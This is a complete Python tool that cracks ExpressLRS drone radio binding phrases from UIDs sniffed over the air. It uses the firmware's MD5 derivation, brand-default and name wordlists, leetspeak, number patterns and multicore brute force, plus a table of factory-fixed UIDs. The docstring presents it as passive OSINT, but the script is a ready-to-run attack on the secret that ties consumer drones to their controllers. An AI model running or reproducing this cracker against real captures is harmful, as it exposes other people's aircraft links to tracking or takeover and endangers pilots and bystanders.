#!/usr/bin/env python3
"""
phrase_crack.py — offline ExpressLRS bind-phrase cracker (OSINT).

Given a UID (or UID tail) captured passively by the ELRS sniffer — the sync
packet leaks UID[3..5] in the clear — try to recover the BINDING PHRASE that
generated it, using the exact ELRS derivation:

    UID = md5(('-DMY_BINDING_PHRASE="<phrase>"').encode()).digest()[:6]

Verified against the known vector: "ExpressLRS" -> 43 7f 2f b1 d3 39.

Modes (applied in this order; the plain dictionary always runs):
  (default)   dictionary x suffixes ["", "1", "123", "2023", "2024", "2025", "!"]
  --leet      l33tspeak variants (single + double a4 e3 i1 o0 s5, capped)
  --case      Capitalized + UPPER variants of every word-side candidate
  --wordnums  word+d, d+word, word_d for d in 0..9999  (the classic pattern)
  --alnum N   brute force [a-z0-9]^N across all CPU cores (N=5 ~60M ~ tens of
              seconds multicore; N=6 ~2.2B — ETA printed before starting)

Usage:
    python3 phrase_crack.py 61ace1                     # dictionary only
    python3 phrase_crack.py 61ace1 --wordnums --leet --case
    python3 phrase_crack.py 437f2fb1d339 --alnum 5

Exit code 0 if any phrase matched, 1 otherwise.

Legal posture: OFFLINE attack on YOUR OWN passive captures, for pilot
labeling only (receive, never control). See README "OSINT" section.
"""
import argparse
import hashlib
import itertools
import multiprocessing
import os
import string
import sys
import time

ALNUM = string.ascii_lowercase + string.digits
SUFFIXES = ["", "1", "123", "2023", "2024", "2025", "!"]
LEET_MAP = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5"}
LEET_CAP = 24  # variants per word (single + a capped set of doubles)


def uid_for_phrase(phrase):
    return hashlib.md5(('-DMY_BINDING_PHRASE="%s"' % phrase).encode()).digest()[:6]


# ---------------------------------------------------------------------------
DEFAULT_PHRASES = ["ExpressLRS", "expresslrs", "default", "elrs", "bind", "password"]

FPV_WORDS = [
    "freestyle", "cinewhoop", "tinyhawk", "mobula", "drone", "fpv", "racing",
    "quad", "quadcopter", "whoop", "toothpick", "longrange", "longrange2024",
    "dji", "hdzero", "walksnail", "betafpv", "iflight", "geprc", "diatone",
    "tbs", "teamblacksheep", "radiomaster", "jumper", "tx16s", "pocket",
    "zoro", "nano", "micro", "5inch", "5in", "3inch", "rooster", "mongoose",
    "lumenier", "qav", "sourceone", "source", "apex", "sl5", "knight",
    "caddx", "runcam", "foxeer", "tmotor", "emma", "holybro", "siyi",
]

FIRST_NAMES = """
james mary robert patricia john jennifer michael linda david elizabeth
william barbara richard susan joseph jessica thomas sarah charles karen
christopher lisa daniel nancy matthew betty anthony margaret mark sandra
donald ashley steven kimberly paul emily andrew michelle joshua amanda
kevin melissa brian deborah stephanie george laura timothy heather
ronald angela jason edward abigail ryan denise gary fiona nicholas julie
eric alexandra adam olivia nathan carol ethan janet juan maria carlos rosa
luis ana diego miguel elena alex sofia lucas valentina max emma leon hannah
finn lina ben marie jan peter anna hans ulrike klaus birgit stefan sabine
marco chiara luca giulia antonio isabella victoria martina sophia amelia
oliver harry jack noah charlie jacob alfie ruby chloe isla poppy daisy freya
erin hollie bethany megan cerys aaron abby adrian alan albert aileen alina
amir amy andre andrea angelo anita archie arthur asha barry beatrice bernard
beverly blake bonnie brandon brenda bridget brooke bruce bryan caleb cameron
carla caroline catherine cecilia cedric celia chelsea chester christian
christina cindy clara clarence claudia clifford clint colin colton connor
cora corey cornelius craig crystal curtis cynthia dale damian daniela daphne
darius dean declan dennis derek derrick desiree diana dominic donna dorian
doris douglas duane duncan dustin dwight dylan earl edgar edith edmund edna
edwin eileen elaine elbert elena eli elias elijah elisa ella ellen elmer
eloise elsa elvira emanuel emerson emilia emmanuel enrico enrique eric erica
erik erika ernest estelle esther ethel eugene eula eunice evan evelyn everett
faith felix fern fiona flora fletcher freda gabriel garrett gavin gene geoffrey
gilbert glenn gloria gordon grace grant gregory gretchen guillermo gwen haley
harvey hazel hector heidi helen henry herbert herman hester holly homer hope
horace howard hugh ian ida ignacio imelda inez ingrid irene iris irma isaac
isabel ivan jared jasmine javier jean jeffrey jenna jennie jeremy jerome jesse
jill joan joanna joel jonah jordan jorge josephine joy judith julia julian
""".split()

BUILTIN_WORDS = DEFAULT_PHRASES + FPV_WORDS + FIRST_NAMES

# ---------------------------------------------------------------------------
# Factory-fixed UID intelligence (checked BEFORE any hashing — instant).
# Stock firmware with NO binding phrase uses a MAC-derived UID, not a phrase —
# these are not crackable, they are *recognized*. Add new factory dumps to
# tools/factory_uids.json (same format: {"hexuid": "label"}); it is loaded
# and merged over this built-in table when present.
FACTORY_UIDS = {
    "0000609e0b58": "HappyModel stock batch (Mobula6/Crux3/Mobula7 ELRS, factory default)",
    "000096af1f7c": "HappyModel stock batch 2 (Mobula6 ELRS)",
}

# Brand-default binding phrases (official per-brand defaults; the classic
# "never changed it" cases). Tagged for labeled match output. Verified:
# iloveiflight -> UID 12ce9b6e75c4 (md5 self-check path).
BRAND_DEFAULTS = [
    ("iloveiflight", "iFlight official default (Commando8 + iFlight BNF line)"),
    ("happymodel", "HappyModel"), ("betafpv", "BetaFPV"), ("radiomaster", "RadioMaster"),
    ("jumper", "Jumper"), ("geprc", "GEPRC"), ("iflight", "iFlight"), ("emax", "EMAX"),
    ("flywoo", "Flywoo"), ("darwinfpv", "DarwinFPV"), ("eachine", "Eachine"),
    ("hqprop", "HQProp"), ("tbs", "Team BlackSheep"), ("teamblacksheep", "Team BlackSheep"),
    ("mobula6", "HappyModel Mobula6"), ("mobula7", "HappyModel Mobula7"),
    ("mobula8", "HappyModel Mobula8"), ("crux3", "HappyModel Crux3"),
    ("tinyhawk", "EMAX Tinyhawk"), ("tinyhawk2", "EMAX Tinyhawk II"),
    ("tinyhawk3", "EMAX Tinyhawk III"), ("cetus", "BETAFPV Cetus"),
    ("cetusx", "BETAFPV Cetus X"), ("cetuspro", "BETAFPV Cetus Pro"),
    ("meteor65", "BETAFPV Meteor65"), ("meteor75", "BETAFPV Meteor75"),
    ("meteor85", "BETAFPV Meteor85"), ("commando8", "iFlight Commando8"),
    ("zorro", "RadioMaster Zorro"), ("boxer", "RadioMaster Boxer"),
    ("tpro", "RadioMaster T-Pro"), ("t20", "RadioMaster T20"), ("pocket", "RadioMaster Pocket"),
    ("literradio", "RadioMaster LiteRadio"), ("avatar", "Walksnail Avatar"),
    ("o4", "DJI O4"), ("spektrum", "Spektrum"), ("futaba", "Futaba"), ("frsky", "FrSky"),
    ("fatshark", "FatShark"), ("walksnail", "Walksnail"), ("hdzero", "HDZero"),
    ("orqa", "Orqa"), ("dji", "DJI"), ("fpv", "FPV"), ("freestyle", "freestyle"),
    ("cinewhoop", "cinewhoop"), ("longrange", "longrange"), ("tinywhoop", "Tiny Whoop"),
    ("drone", "drone"), ("racing", "racing"), ("acro", "acro"),
]


def load_factory_uids():
    import json
    import os
    table = dict(FACTORY_UIDS)
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "factory_uids.json")
    if os.path.exists(path):
        try:
            with open(path) as f:
                table.update({k.lower(): v for k, v in json.load(f).items()})
        except Exception as e:
            print("warning: factory_uids.json unreadable (%s); using built-in table" % e)
    return table


def brand_label(phrase):
    """Map a matched phrase back to a BRAND_DEFAULTS label (base word + suffix)."""
    p = phrase.lower()
    for w, label in sorted(BRAND_DEFAULTS, key=lambda x: -len(x[0])):
        if not p.startswith(w):
            continue
        rest = p[len(w):]
        if rest == "" or rest in SUFFIXES or rest.isdigit() or \
                (rest.startswith("_") and rest[1:].isdigit()):
            return "BRAND DEFAULT (%s): %s" % (label.split(" ")[0], phrase)
    return None


# ---------------------------------------------------------------------------
def leet_variants(word):
    """single + (capped) double l33tspeak substitutions."""
    out = set()
    chars = list(word)
    for i, c in enumerate(chars):
        if c in LEET_MAP:
            v = chars[:]
            v[i] = LEET_MAP[c]
            out.add("".join(v))
    for i in range(len(chars)):
        for j in range(i + 1, len(chars)):
            if chars[i] in LEET_MAP and chars[j] in LEET_MAP:
                v = chars[:]
                v[i] = LEET_MAP[chars[i]]
                v[j] = LEET_MAP[chars[j]]
                out.add("".join(v))
                if len(out) >= LEET_CAP:
                    return sorted(out)
    return sorted(out)


def case_multipliers(phrase, do_case):
    yield phrase
    if do_case:
        yield phrase.capitalize()
        yield phrase.upper()


def dict_candidates(words, do_leet, do_case):
    seen = set()
    for w in words:
        w = w.strip()
        if not w:
            continue
        variants = [w] + (leet_variants(w.lower()) if do_leet else [])
        for v in variants:
            for s in SUFFIXES:
                for p in case_multipliers(v + s, do_case):
                    if p not in seen:
                        seen.add(p)
                        yield p


def wordnums_candidates(words, do_case):
    seen = set()
    for w in words:
        w = w.strip().lower()
        if not w:
            continue
        for d in range(10000):
            for p0 in (w + str(d), str(d) + w, w + "_" + str(d)):
                for p in case_multipliers(p0, do_case):
                    if p not in seen:
                        seen.add(p)
                        yield p


# ---------------------------------------------------------------------------
# multiprocessing workers for --alnum
_T = []  # per-process targets: (bytes, is_full)


def _worker_init(targets):
    global _T
    _T = targets


def _alnum_check(job):
    prefix, length = job
    matches = []
    tried = 36 ** (length - len(prefix))
    for tail in itertools.product(ALNUM, repeat=length - len(prefix)):
        p = prefix + "".join(tail)
        u = uid_for_phrase(p)
        for t, full in _T:
            if (u == t) if full else u.endswith(t):
                matches.append((t.hex(), p, "FULL" if full else
                                "tail-only: PROBABLE (verify with more captures)"))
    return matches, tried


def run_alnum(length, targets, matches):
    total = len(ALNUM) ** length
    workers = os.cpu_count() or 1
    eta = total / 1_300_000 / workers
    print("alnum %d: %s combos across %d workers (~%s wall-clock at ~1.3M hashes/s/core)"
          % (length, f"{total:,}", workers,
             "%ds" % eta if eta < 120 else "%.1f min" % (eta / 60)))
    if length == 1:
        jobs = [(c, length) for c in ALNUM]
    else:
        jobs = [a + b for a in ALNUM for b in ALNUM]  # 2-char prefix ranges
        jobs = [(p, length) for p in jobs]
    t0 = time.time()
    tried = 0
    last = t0
    with multiprocessing.Pool(workers, initializer=_worker_init,
                              initargs=(targets,)) as pool:
        for m, n in pool.imap_unordered(_alnum_check, jobs, chunksize=1):
            matches.extend(m)
            tried += n
            now = time.time()
            if now - last >= 2:
                rate = tried / (now - t0)
                eta_s = (total - tried) / rate if rate else 0
                print("  alnum: %s/%s tried, %.0f/s, ETA %ds"
                      % (f"{tried:,}", f"{total:,}", rate, eta_s), flush=True)
                last = now


# ---------------------------------------------------------------------------
def parse_uid(text):
    h = text.strip().replace(" ", "").replace("0x", "").lower()
    if not h or len(h) % 2 or any(c not in "0123456789abcdef" for c in h):
        raise ValueError("bad UID hex: %r" % text)
    raw = bytes.fromhex(h)
    if not 1 <= len(raw) <= 6:
        raise ValueError("UID must be 1..6 bytes: %r" % text)
    return raw


def run_stage(name, gen, targets, matches):
    t0 = time.time()
    tried = 0
    last = t0
    for p in gen:
        u = uid_for_phrase(p)
        tried += 1
        for t, full in targets:
            if (u == t) if full else u.endswith(t):
                kind = "FULL" if full else "tail-only: PROBABLE (verify with more captures)"
                if (t.hex(), p) not in {(m[0], m[1]) for m in matches}:
                    matches.append((t.hex(), p, kind))
        now = time.time()
        if now - last >= 2:
            print("  %s: %s tried, %.0f/s" % (name, f"{tried:,}", tried / (now - t0)), flush=True)
            last = now
    return tried, time.time() - t0


def main():
    ap = argparse.ArgumentParser(description="ELRS bind-phrase cracker (offline OSINT)")
    ap.add_argument("uids", nargs="*", help="UID hex strings (full 6-byte or tail)")
    ap.add_argument("--uids", dest="uidfile", help="file with one UID per line")
    ap.add_argument("--wordlist", dest="wordlist", help="custom wordlist file")
    ap.add_argument("--rockyou", dest="rockyou",
                    help="path to a local rockyou-format wordlist (never bundled; "
                         "e.g. Kali /usr/share/wordlists/rockyou.txt or SecLists)")
    ap.add_argument("--leet", action="store_true", help="l33tspeak variants")
    ap.add_argument("--case", action="store_true", help="Capitalized + UPPER variants")
    ap.add_argument("--wordnums", action="store_true",
                    help="word+d, d+word, word_d for d in 0..9999")
    ap.add_argument("--alnum", type=int, metavar="N",
                    help="brute force [a-z0-9]^N across all cores (1..6)")
    args = ap.parse_args()

    assert uid_for_phrase("ExpressLRS") == bytes.fromhex("437f2fb1d339"), "self-check failed"
    assert uid_for_phrase("iloveiflight") == bytes.fromhex("12ce9b6e75c4"), "brand vector failed"

    targets = []
    for u in args.uids:
        t = parse_uid(u)
        targets.append((t, len(t) == 6))
    if args.uidfile:
        for line in open(args.uidfile):
            line = line.strip()
            if line and not line.startswith("#"):
                t = parse_uid(line)
                targets.append((t, len(t) == 6))
    if not targets:
        ap.error("no UIDs given (argv or --uids file)")

    # 0) factory-fixed UID table — instant, before any hashing
    factory = load_factory_uids()
    factory_hits = []
    remaining = []
    for t, full in targets:
        hit = None
        if full and t.hex() in factory:
            hit = t.hex()
        elif not full:
            for fu in factory:  # tail against known factory UIDs
                if bytes.fromhex(fu).endswith(t):
                    hit = fu
                    break
        if hit:
            factory_hits.append((hit, factory[hit]))
        else:
            remaining.append((t, full))
    if factory_hits:
        print("factory-fixed UID matches (FACTORY-UID, no cracking needed):")
        for uid, label in factory_hits:
            print("  %s  ->  %s   (FACTORY-UID)" % (uid, label))
    for t, full in remaining:
        print("target: %s (%s)" % (t.hex(), "full UID" if full else "tail %d bytes" % len(t)))

    words = [w for w, _ in BRAND_DEFAULTS] + list(BUILTIN_WORDS)
    if args.wordlist:
        words += open(args.wordlist, encoding="utf-8", errors="replace").read().splitlines()
    if args.rockyou:
        # rockyou is never bundled (license/size); commonly from Kali
        # /usr/share/wordlists/rockyou.txt or the SecLists project.
        words += open(args.rockyou, encoding="utf-8", errors="replace").read().splitlines()
        print("rockyou loaded: %d words total" % len(words))
    print("dictionary: %d words (brand defaults first)" % len(words))

    matches = []
    total = 0
    t_start = time.time()
    # ordering: dict -> leet -> case -> wordnums -> alnum
    total += run_stage("dict", dict_candidates(words, False, False), remaining, matches)[0]
    if args.leet:
        total += run_stage("leet", dict_candidates(words, True, False), remaining, matches)[0]
    if args.case:
        total += run_stage("case",
                           (p for p in dict_candidates(words, False, True)
                            if p != p.lower()), remaining, matches)[0]
    if args.wordnums:
        total += run_stage("wordnums", wordnums_candidates(words, args.case),
                           remaining, matches)[0]
    if args.alnum:
        if not 1 <= args.alnum <= 6:
            ap.error("--alnum length must be 1..6")
        run_alnum(args.alnum, remaining, matches)
        total += len(ALNUM) ** args.alnum

    print("\n%d hashes total in %.1fs" % (total, time.time() - t_start))
    if matches or factory_hits:
        if matches:
            print("\nMATCHES:")
            for uid, phrase, kind in matches:
                ann = brand_label(phrase)
                tag = "%s, %s" % (ann, kind) if ann else kind
                print("  %s  <-  %r   (%s)" % (uid, phrase, tag))
        return 0
    print("\nno match (dictionary + enabled modes exhausted; beyond this, "
          "targeted wordlists / GPU md5 are the next step)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
